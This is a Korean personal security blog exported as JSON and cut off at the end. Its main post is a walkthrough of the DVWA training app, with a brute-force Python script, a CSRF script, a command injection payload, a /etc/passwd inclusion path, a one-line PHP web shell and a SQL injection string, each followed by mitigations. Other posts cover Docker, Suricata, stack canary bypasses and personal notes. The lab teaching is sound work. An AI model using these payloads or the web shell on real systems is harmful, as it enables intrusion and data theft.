{"meta":{"title":"JHYEON BLOG","subtitle":"Web Development & Security Research","description":"정동현(JHYEON BLOG)","author":"jhyeon","url":"https://blog.jhyeon.dev","root":"/"},"pages":[{"title":"All Tags","date":"2021-01-17T07:38:15.000Z","updated":"2021-01-17T07:38:15.000Z","comments":true,"path":"tags/index.html","permalink":"https://blog.jhyeon.dev/tags/index.html","excerpt":"","text":""},{"title":"All Category","date":"2021-01-17T07:38:25.000Z","updated":"2021-01-17T07:38:25.000Z","comments":true,"path":"categories/index.html","permalink":"https://blog.jhyeon.dev/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"DVWA 웹 취약점 모의 훈련 도구 리뷰","slug":"dvwa-review-210119","date":"2021-01-18T15:00:00.000Z","updated":"2021-01-18T15:00:00.000Z","comments":true,"path":"2021/01/19/dvwa-review-210119/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/19/dvwa-review-210119/","excerpt":"","text":"IntroDVWA는 웹 취약점 모의 해킹(훈련) 도구이며 다운로드는 아래 링크에서 가능합니다. http://www.dvwa.co.uk 해당 포스트에서는 초심자인 easy 난이도와 대응 방안에 대해서만 작성합니다. 기능 별 순차적으로 업데이트 할 예정입니다! Brute Force해당 문제는 제목 답게 “Brute Force(무차별 대입 공격)” 기법을 사용하는 문제이다. 그냥 평범하게 로그인 창이 있는데, 공격 벡터는 두군데 밖에 없다. (아이디 / 패스워드 입력폼) 사용자로부터 입력을 받는 폼에서 이제 무차별 대입 공격 기법을 시도하여 계정을 알아내는 방식이다. &lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123; // Get username $user = $_GET[ &#39;username&#39; ]; // Get password $pass = $_GET[ &#39;password&#39; ]; $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; 로직은 매우 간단하다. POST 방식으로 넘어온 username, password 값을 받아서 각각 $user, $pass 변수에 저장한다. // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); 이후 넘어온 $user(username) 값과 $pass(password) 값을 users 테이블과 매칭해 데이터가 있는지 조회하는 쿼리문을 작성했다. 일치하는 정보가 있으면 login successful 로 넘어갈 것이고, 없거나 하나라도 틀린정보가 있다면 login failed 로직쪽으로 넘어갈 것이다. 해당 단계는 아래 python 코드를 사용하여 풀이할 수 있다. #!/usr/bin/python3 import requests from time import sleep url = &quot;http://192.168.25.60:4731/vulnerabilities/brute/&quot; session = &#123;&quot;PHPSESSID&quot;:&quot;sessionid&quot;,&quot;security&quot;:&quot;low&quot;&#125; with open(&#39;password.txt&#39;) as f: while True: line = f.readline().splitlines() param = &#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:line, &quot;Login&quot;:&quot;Login&quot;&#125; r = requests.get(url, params=param, cookies=session) sleep(1) if(&quot;Welcome to the password protected area admin&quot; in r.text): print(&quot;password matching!!&quot;,line) else: print(&quot;not match&quot;) if not line: break 코드에 사용된 “password.txt”는 github에 검색좀 해보면 나오는 리스트들이다. 이러한 비밀번호 리스트들을 사용해서 한줄씩 대입을 하여 로그인이 됐을 때의 상태 / 실패했을 때의 상태를 체크해서 문제를 풀어주면 된다. Brute Force (대응 방안)무차별 대입 공격을 막는 방법은 여러가지가 있을 수 있지만 자동화 도구나 봇을 통해 작업을 하는 것을 차단할 수 있는 “google recapture”를 적용하면 된다. 또한 연속적으로 시도하지 못하도록 “최대 시도 횟수 제한” 기능을 넣는다면 이런 공격으로부터 방어를 할 수 있지 않나 싶다. Command Injection커맨드 인젝션(Cmd Injection) 공격은 웹 앱에서 시스템 명령을 사용할 때 적절한 필터링 조치가 되어 있지 않은 경우 하나의 커맨드안에서 두개의 명령을 실행 해 공격자가 원하는 결과를 얻어낼 수 있는 공격입니다. &lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) &#123; // Get input $target = $_REQUEST[ &#39;ip&#39; ]; // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123; // Windows $cmd = shell_exec( &#39;ping &#39; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#39;ping -c 4 &#39; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; 우선 코드를 분석해보면 REQUEST로 사용자로 부터 ip값을 입력받아 $target 변수에 저장하고, 하단의 shell_exec 시스템 함수로 ping 명령을 수행합니다. ex) shell_exec(ping 127.0.0.1) ex) shell_exec(ping -c 4 127.0.0.1) 넘어온 ip를 대입해서 함수를 맞춰보면 이런 구조가 되겠죠. 다만, 아래와 같이 사용할 경우 커맨드 인젝션이 발생하게 됩니다. ping -c 4 127.0.0.1 | pwd 127.0.0.1로 핑을 보내는 동시에 뒤에 |(파이프라인)으로 처리된 pwd 명령까지 함께 실행하게 됩니다. 즉 하나의 커맨드안에서 두개의 명령을 실행하는 것이 가능하다는 의미이죠. 실무에서는 잘 없겠지만 매~~우매우 취약한 사이트에 이런 기능이 있다고 하면 공격자가 RCE 환경을 만들어버릴 수 있는 취약점입니다. Command Injection(대응 방안)제가 생각하기엔, 실무나 회사에서 과연 이런 시스템 함수를 써서 뭔가의 기능을 사용할 일이 있나 싶습니다. 그러나, 다방면으로 쓰는 분들이 있을 수 있기에 간단한 대응 방안을 나열해봅시다. 특수문자 필터링 입력값 regex 정규식 표현 사용 화이트 리스트 기반 명령어 실행 (사용할 수 있는 명령어 제한) 뭐 이정도가 될 수 있겠네요 ㅎㅎ.. CSRFCSRF(Cross Site Request Forgery)는 공격자가 수정, 삭제 등의 행위를 CSRF 취약점이 발생하는 웹 페이지에, 요청을 보내 처리하는 방식의 취약점을 의미합니다. DVWA에서의 CSRF 폼은 아래와 같습니다. &lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) &#123; // Get input $pass_new = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; 소스코드를 분석해보면 간단한 로직으로 기능이 돌아갑니다. 새 비밀번호, 새 비밀번호 체크 두 가지 값을 입력받아서, 두 값이 같은지 검사한 뒤 users 테이블의 현재 유저(dvwa 로그인 사용자)에 대한 비밀번호를 업데이트하는 쿼리문을 요청합니다. 여기서 CSRF 취약점이 어디서 발생하냐 할 수 있는데, 자세히 보면 현재 비밀번호를 변경할 때 입력 값을 통해 바로 업데이트 쿼리문을 수행합니다. 그럼, 공격자의 입장에서는 비밀번호 변경 페이지에 변경할 비밀번호 값과 함께 요청을 보내는 방식의 공격을 통해 사용자의 비밀번호를 변경이 가능합니다. #!/usr/bin/python3 import requests url = &quot;http://192.168.25.61:4731/vulnerabilities/csrf/&quot; session = &#123;&quot;PHPSESSID&quot;:&quot;sessionid&quot;,&quot;security&quot;:&quot;low&quot;&#125; param = &#123;&quot;password_new&quot;:&quot;0000&quot;, &quot;password_conf&quot;:&quot;0000&quot;, &quot;Change&quot;:&quot;Change&quot;&#125; r = requests.get(url, params=param, cookies=session) if(&quot;Password Changed.&quot; in r.text): print(&quot;password changed!&quot;) else: print(&quot;password change failed&quot;) python 경우에는 위 코드로 쉽게 수정이 가능합니다. 해당 방법 이외에도 공격자 입장에서는 가짜 페이지를 만들어서 그쪽으로 유도하거나 이메일 통해서도 공격 시도가 가능하게 됩니다. CSRF (대응 방안) CSRF TOKEN 추가 https://portswigger.net/web-security/csrf/tokens HTTP Header(Referer) 검증 https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Referer File InclusionFile Inclusion이란, LFI(Local FIle Include)와 동일한 개념이라고 생각하면 됩니다. 즉, 로컬 저장소에 저장된 파일을 페이지에서 불러올 수 있는 취약점입니다. &lt;?php // The page we wish to display $file = $_GET[ &#39;page&#39; ]; ?&gt; low 레벨에서는 소스코드가 매우 간단합니다. page 파라미터를 넘겨받아서 그대로 페이지에 include 해주는 로직입니다. 그럼 여기서, 페이지에 나와있는 file1, fil2, file3.php는 당연히 로컬 서버의 저장소에 저장이 되어 있겠죠? 이런 점을 생각해서 다른 로컬 파일들을 읽어오면 됩니다. ?page=/etc/passwd ?page=/etc/~~ ... LFI를 활용해서는 php 설정 옵션인 allow_url_include 가 ON으로 되어 있을 경우 RFI(Remote File Inclusion) 외부 URL를 읽어서 페이지에 로드하는 것도 가능합니다. 이에 대해서는 DVWA 리뷰가 아닌 LFI &amp; RCE 라는 주제로 새 포스팅에서 다뤄볼 예정입니다. File Inclusion(대응 방안) php를 사용할 때 외부 파일을 로드하지 못하도록 allow_url_include, url_fopen 옵션 OFF 입력값 필터링(preg_match, regex 등) 특정 디렉토리에서만 파일을 읽어올 수 있도록 조치 File Upload파일 업로드(File Upload) 취약점을 다루는 페이지입니다. 파일 업로드 취약점은 웹 애플리케이션 내 서버에 파일을 업로드 하는 기능이 있을 때 업로드 하는 파일에 대한 검사를 하지 않고 서버에 다이렉트로 업로드 되는 경우 공격자가 “웹쉘”, “악성파일” 등을 업로드하여 서버에 접근할 수 있는 취약점 입니다. &lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) &#123; // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; ?&gt; 코드도 매우 간단합니다. (low 레벨이라. ㅎㅎ) 사용자로 부터 업로드할 파일을 받아서 DVWA ROOT 경로 -&gt; hackable/uploads 폴더에 파일을 업로드하도록 되어 있네요. 이 과정에서 파일에 대한 검증 로직이 없기 때문에 위에서 언급했던 웹쉘 업로드가 가능합니다. &lt;?php system($_GET[&#39;cmd&#39;]); ?&gt; 시스템 함수를 사용하여 웹쉘을 만들어주고, 업로드 하면 됩니다. 저는 shell.php 라는 파일명으로 업로드 하였을 때 (hackable/uploads/shell.php)로 저장이 됩니다. 그럼 이제 해당 경로로 가서 웹쉘을 실행시켜봅시다. File Upload (대응 방안) 업로드 하는 파일의 확장자 검사 또는 화이트 리스트 적용(jpg, png, gif 등) 파일 실행권한(x) 제거 업로드 시에 파일 경로/파일 명을 알 수 없도록 난독화하여 저장 특수문자 필터링 SQL InjectionSQL Injection 취약점은 OWASP 에서도 매번 Top 10 이슈에 뜨는 취약점이라고 할 수 있습니다. 공격자가 취약한 사이트를 대상으로, 악의적인 쿼리를 만들어 요청을 보냄으로써 DB 시스템에 접근, 제어(수정, 삭제, 등록), 조회 등의 행위가 가능하게 됩니다. 예시로 숙박앱을 운영하는 기업중 한 군데가 SQL Injection 공격을 받아 개인정보가 유출당했던 피해도 있었죠 아무튼.. 한번 실습으로 떠나봅시다. &lt;?php if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) &#123; // Get input $id = $_REQUEST[ &#39;id&#39; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); &#125; ?&gt; 사용자로부터 입력을 받는 폼은 (id) 부분입니다. 값을 입력받아서 $id 변수에 저장하고, users 테이블에 user_id=$id 인 경우를 조회하게 됩니다. 그리고 만약 조회된 데이터가 있을 경우 first_name, last_name을 출력해주는 로직입니다. 어디서 취약점이 발생했을까요? $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; 해당 부분을 보면 사용자로부터 입력값이 넘어온 상태에서 그대로 $id 변수에 저장하고 어떠한 검증도 거치지 않습니다. 그래서 사용자가 어떤 값을 입력하든 모두 쿼리문에 들어간다는 의미로 볼 수 있죠. 만약 해당 쿼리문의 결과를 무조건 참(True)으로 만든다면 결과는 당연히 조회하는 테이블의 모든 행을 출력할 수 있습니다. 아래 쿼리를 입력해봅시다. &#39; or 1=1#&#39; 조회하는 테이블의 모든 행이 조회가 가능했습니다. 이러한 sql injection 공격의 종류에는 아래와 같이 다양합니다. nosql injection time based injection blind injection union injection … 나중에 예제를 가지고 포스팅 하겠지만, 이외에도 수많은 공격 기법이 존재함을 알 수 있습니다. SQL Injection 대응 방안 특수문자 필터링 PDO(Prepared Statement) 방식의 코드 작성 입력 값 필터링(preg_match) 입력 값 치환(addslashes 등의 함수) 사실 PDO 방식으로만 해도 거의 대부분의 인젝션 공격은 막을 수 있다고 봅니다.","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"https://blog.jhyeon.dev/tags/DVWA/"},{"name":"Pentesting","slug":"Pentesting","permalink":"https://blog.jhyeon.dev/tags/Pentesting/"}]},{"title":"Mac Big Sur 사용 후기 및 백업의 중요성..","slug":"memo-210118","date":"2021-01-17T15:00:00.000Z","updated":"2021-01-17T15:00:00.000Z","comments":true,"path":"2021/01/18/memo-210118/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/18/memo-210118/","excerpt":"","text":"불과 며칠 전 내 소중한 맥북이 의도치 않은 물리적 파손으로 서비스 센터에 다녀왔다. 큰 고장은 아니였으나 제일 많이 사용하는 키패드 일부가 파손되서 눈물을 흘리면서 수리를 받아야 겠구나 생각했다. 그 때 센터 가는김에 시스템 포맷도 한번 해야 겠다고 문득 생각이 들었다. (왜냐.. Big Sur의 고질적 오류) 맥에서 Big Sur 운영체제가 출시된지 1달?2달 된거같은데 초반기에 “최신버전이 그래도 최고지” 라는 안일한 생각에 업데이트를 했다가 잦은 오류로 인해 엄청난 고생을 했던 경험이 있다. 그런데 왠걸, 애플에서 빅서 잡 오류를 고친 11.0.2 버전을 내놓았다. 여기서 또 나는 혹해서 이번엔 고쳐졌겠지 라는 두번째 안일한 생각과, 주변 사람들이 대부분 고쳐진 것 같은데 라는 의견을 수렴해 또 다시 돌아오지 못할 업데이트 길을 걷고 말았다. 기쁜 마음으로 새 운영체제를 맞이한 순간 초반에 나를 반겨준 오류들은 고쳐진 것 같으나 다양한 오류들이 아직 남아있었다. (페럴 네트워크 오류, 키 입력 문제 등..) 작동해야 할 것들이 안하니깐 슬슬 또 화가 나기 시작했고 이번에는 새로운 버그인가 싶은 간헐적인 버벅임(랙) 현상이 있었다. 이런 여러가지 계기를 통해서 수리를 받으러 가면서 포맷도 맡겨버릴려고 중요 문서나 파일들은 클라우드에 백업을 해둔 뒤, 클라우드 저장소에 폴더만 올라간 것을 확인하고 바로 서비스 센터로 가버렸다. (이 때.. 폴더안에 내용들을 확인했어야 하는데..) 서비스 맡기니깐 키보드 쪽은 가위식 키보드라서 키캡 부분에 약간 문제가 있는거라 금방 수리된다고 전달 받았고 포맷이 1-2일 정도 걸린다고 하셨다. 맡기고 나와서 한 1시간쯤 뒤인가 생각보다 포맷이 빨리되서 찾으러 오셔도 된다고 전화가 왔고.. 근처 일보고 있었다가 점심시간 거쳐서 찾으러 갔다. 그렇게 깔끔하게 포맷된 맥북을 가지고 처음부터 다시 환경 세팅을 하면서 백업 파일도 보는데.. 충격스럽게도 클라우드에 올라간 파일들이 폴더만 올라갔고 안에 내용들이 네트워크 오류로 인해서 하나도 안올라갔던 것이였다. 사태의 심각성을 깨닫고 최신 백업은 아니지만 예전에 다른곳에 백업해둔 파일을 찾아서 하나씩 복구는 했지만 최근에 씩 엎고 새로 만든 “블로그” 파일이 전부 날아가서 멘붕이 왔다. 그래도 블로그에 올라간 포스트들은 github에 public 버전으로 업데이트가 되어있었기에 그나마(?) 다행이라고 생각했다. 결국 블로그 설정 처음부터 다시하면서 업로드한 포스트들 다 git으로 내려받아서 내용 하나하나 수동 복구를 했다 ^^. 약 3시간 정도 걸린 것 같은데 삽질도 이런 삽질이 없던 것 같다. 교훈 백업은 항상 끝까지 잘 확인하자 이중 백업도 필수 (이거 안했으면 진짜로 망했다) 깃허브가 나를 살렸다","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"Big Sur","slug":"Big-Sur","permalink":"https://blog.jhyeon.dev/tags/Big-Sur/"},{"name":"Mac OS","slug":"Mac-OS","permalink":"https://blog.jhyeon.dev/tags/Mac-OS/"},{"name":"Backup","slug":"Backup","permalink":"https://blog.jhyeon.dev/tags/Backup/"}]},{"title":"2021년 IT/보안 분야 전망/동향 자료","slug":"newit-210112","date":"2021-01-11T15:00:00.000Z","updated":"2021-01-11T15:00:00.000Z","comments":true,"path":"2021/01/12/newit-210112/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/12/newit-210112/","excerpt":"","text":"해당 포스트는 노션으로 이전되었습니다. https://www.notion.so/jhyeon/2021-IT-6c25400797494e7f9c49640675cf6d53","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"정보보안","slug":"정보보안","permalink":"https://blog.jhyeon.dev/tags/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/"},{"name":"최신동향","slug":"최신동향","permalink":"https://blog.jhyeon.dev/tags/%EC%B5%9C%EC%8B%A0%EB%8F%99%ED%96%A5/"}]},{"title":"Ubuntu 20.04 Docker Installation","slug":"docker-install-210108","date":"2021-01-07T15:00:00.000Z","updated":"2021-01-07T15:00:00.000Z","comments":true,"path":"2021/01/08/docker-install-210108/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/08/docker-install-210108/","excerpt":"","text":"Step 1 우분투 패키지 업데이트를 진행합니다. sudo apt update Step 2 도커 필수 라이브러리를 설치합니다. sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common Step 3 GPG KEY 등록 curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - Step 4 Repositry 생성 sudo add-apt-repository \\ &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) \\ stable&quot; Step 5 도커 설치 sudo apt update sudo apt install docker sudo apt install docker-compose","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://blog.jhyeon.dev/tags/Docker/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.jhyeon.dev/tags/Ubuntu/"}]},{"title":"Suricata 설치 & 기초","slug":"suricata-210108","date":"2021-01-07T15:00:00.000Z","updated":"2021-01-07T15:00:00.000Z","comments":true,"path":"2021/01/08/suricata-210108/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/08/suricata-210108/","excerpt":"","text":"Suricata란?IDS(Intrusion Detection System) 시스템으로, 실시간 IDS, IPS, NSM(Network Security Monitoring) 및 pcap 캡처를 지원한다. Suricata Installation아래 설치 가이드는 우분투 20.04 환경에 맞는 설치 방법이다. 18.04는 아마 “sudo apt install suricata”로도 설치가 가능할 것이다. sudo apt update sudo apt install software-properties-common sudo add-apt-repository ppa:oisf/suricata-stable sudo apt update sudo apt install suricata Suricata 기본 룰 셋 다운로드sudo suricata-update sudo systemctl restart suricata 테스트 룰 셋alert tcp any any -&gt; any 80 (msg:&quot;Connection to sites.com&quot;; content:&quot;sites.com&quot;; sid:1001; rev:1;) 위와 같이 테스트 룰 셋을 짜고 저장하면 80포트로 tcp통신하는 sites.com에 대한 패킷을 로그에 찍을 수 있다. 로그 파일은 “/var/log/suricata/fast.log”에서 볼 수 있고 tail 명령어로 실시간으로 찍어볼 수도 있다.","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Suricata","slug":"Suricata","permalink":"https://blog.jhyeon.dev/tags/Suricata/"},{"name":"Network","slug":"Network","permalink":"https://blog.jhyeon.dev/tags/Network/"}]},{"title":"Memory Mitigation - Canary","slug":"mitigation-210102","date":"2021-01-01T15:00:00.000Z","updated":"2021-01-01T15:00:00.000Z","comments":true,"path":"2021/01/02/mitigation-210102/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/02/mitigation-210102/","excerpt":"","text":"Canary 개념메모리 보호 기법(Memory Protection)의 일부에 해당하고, 일반적으로 버퍼 오버플로우(Buffer Overflow) 공격을 수행할 때, SFP(Stack Frame Pointer), RET(Return Address)를 덮어서 공격자가 원하는 흐름을 만들어 줄 수 있는데, 이 때 메모리가 덮어씌워 지는 것을 보호하기 위해서 스택에 할당되는 변수와, SFP(Stack Frame Pointer), RET(Return Address) 사이에서 특정한 값을 추가해서 메모리 변조의 유무를 판단하는 것의 메모리 보호 기법입니다. Canary 종류와 우회 방법Canary 종류에는 3가지로 분류 해볼 수 있습니다. Terminator Canaries Canary 값을 문자열의 끝을 나타내는 문자를 이용해서 생성하는 방식 Random Canaries Canary 값을 랜덤하게 생성 하며, 프로그램 초기 설정 시 전역 변수에 저장 Random XOR Canaries Canary 값을 모든 제어 데이터 또는 일부를 사용하여 XOR-Scramble 하여 생성 Canary Bypassing? Brute-ForceCanary 값은 4byte인데 이 값에서 1byte씩 Brute-Force를 수행하면 Canary 값을 알아낼 수 있습니다. 우선 버퍼의 값을 모두 채운다음에 오는 4byte(canary) 값에 대해서 1byte씩 덮으면서 값을 찾아낼 수 있습니다.0x00 ~ 0xFF(256) 가지의 범위를 가지고 돌려보면 됩니다. Recv, Strncpyrecv와 strncpy 함수는 문자열을 입력 받을 때 NULL 문자가 들어가지 않습니다. 이 점을 이용해서 버퍼가 printf 된다면 버퍼를 채워서 canary값을 출력하게 할 수 있습니다. Canary Routine LeakCanary를 생성하는 루틴이 노출될 경우 역 연산을 통해서 Canary 값을 알아낼 수 있습니다. References https://www.notion.so/jhyeon/Memory-Mitigation-Canary-c00cbfe3a8594b3398138fcf2adb7796 https://koharinn.tistory.com/49 https://xerxes-break.tistory.com/285","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.jhyeon.dev/tags/Linux/"},{"name":"Canary","slug":"Canary","permalink":"https://blog.jhyeon.dev/tags/Canary/"},{"name":"Memory Mitigation","slug":"Memory-Mitigation","permalink":"https://blog.jhyeon.dev/tags/Memory-Mitigation/"}]},{"title":"2020년 정리 & 2021년 계획","slug":"newyear-210102","date":"2021-01-01T15:00:00.000Z","updated":"2021-01-01T15:00:00.000Z","comments":true,"path":"2021/01/02/newyear-210102/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/02/newyear-210102/","excerpt":"","text":"2020 한 해를 돌아보며2020.01 [전공 동아리 회장]2020년을 시작하면서 학교에 입학할 시기부터 활동 해왔던 “해킹 &amp; 보안 동아리인, B@ngsiri 회장을 맡게 되었다. 회장 후보로 나갈 때 다짐했던 것이 기존의 스터디, 세미나, 교육 같은 부분에 있어서 개선을 하고 동아리에 도움이 되는 것들이 있다면 많이 끌어와서 동아리원들에게 많은 도움이 되었으면 하는게 회장 공약이였고, 내 다짐이기도 했다. 그렇게 회장에 당선되고 첫 시작으로 KUCIS(대학정보보호동아리연합회) 신청을 시작으로 여러 교육작인 부분이나 세미나들을 알아 보면서 동아리원들에게 공지하고 하면서 한달 두달 보내왔던 것 같다. 이제 3월이 되고부터는 본격적으로 동아리 홍보에 나서면서 학과에 들어오는 신입생들에 대한 모집을 시작했다. 이번년 초에 코로나19가 확산되면서 사실 오프라인 자리에서는 신입생들을 직접 보면서 홍보를 할 수 없었고 같이 만나서 회식을 하거나 이런 자리도 사실 불가능 했다. 그래서 결국 모집에 있어서는 100% 비대면으로 진행을 했고, 이런 문제를 처음 겪다보니 온라인으로 행사를 준비하는 것이 되게 많이 힘들었던 것 같다. 기존에는 오프라인 모임을 가져서 동아리 홍보도 하고, 후배들이 선배들에게 궁금한 것도 묻고 서로 친해지는 자리가 있었는데 올해는 그런게 없었다.. 그렇지만 어떻게 진행은 했기에 신입생도 모집하고 했지만 그 다음이 항상 문제였다.. 오프라인으로 진행될 행사들이 다 온라인으로 전환되거나 취소되면서, 단도직입적으로 말하면 기존 동아리원들이나 신입생들에게 챙겨줄 수 있는게 많이 없었다. 그래서 지난 부분들 돌아보면 이런게 가장 미안하면서도 좀 아쉬웠던 부분으로 남았다. 결코 회장이라는 자리가 확실히 부담감이 있고 무겁게 느껴졌지만 옆에서 같이 도와주는 운영진들이 있었기에 버틸 수 있지 않았나 싶었다.. 2020.06 [BOB 9기 합격]금년 5월부터 준비하던 BOB(이하, best of the best 9th) 교육생으로 최종 합격을 하였다. 서류 접수부터 필기 시험 면접 준비까지 작년처럼 생생한 기억이 들었고 올해는 꼭 붙겠다는 마인드 하나로 되게 열심히 준비했었던 것 같다. (일반 생활 시간 빼면 거의 BOB 준비에 투자할 만큼 열정을 쏟아 부었지..) 최종 합격 이후 7월부터 이제 본격적인 교육생 신분으로 최고 정보보안전문가인 멘토님들에게 지도를 받고 9월에는 사람들끼리 팀을 모아 하나의 프로젝트를 하는 기간이였다. 7-8월 교육때 거의 밥먹는 것도 포기하면서 하루 10-15시간 교육을 들어서 그런지 하루가 어떻게 지나갔는지도 모르겠다. (이 때 진짜 죽을뻔..) 그렇게 두달이 순식간에 지나가고 9월이 되면서 프로젝트 준비에 한창이였는데 이 때가 가장 고민이 많았다. 왜냐하면 주제를 선정하는데도 어려움이 있었고, 우리팀을 맡아서 지도 해주실 멘토님들도 섭외를 해야했기에.. 그래도 멋진 멘토님들을 구해서 함께 할 수 있어서 정말 좋았다. 같은 팀원으로써도 열심히 해준 팀원들에게도 감사하다는 인사 올립니다! 어쩌다보니 벌써 새해 1월이고 이제 수료까지 3개월밖에 남지 않았다는 것에 아쉬움이 많이 남고있지만 남은 기간 화이팅 해볼 예정입니다! 2020.09 [해킹/보안 연구 데몬팀 합격]개인적으로 들어가고 싶었던 해킹팀에 올해 지원을 해서 합격을 하였다. 준비하는 기간동안 역량을 테스트하는 과제가 주어졌었고 그 과제를 하나하나 해나가면서 열심히 준비했다. (지원 기간동안 BOB랑 많이 겹쳐서 못한 과제도 많아서 불안했던 건 사실…) 결과로 데몬팀에 최종 합격할 수 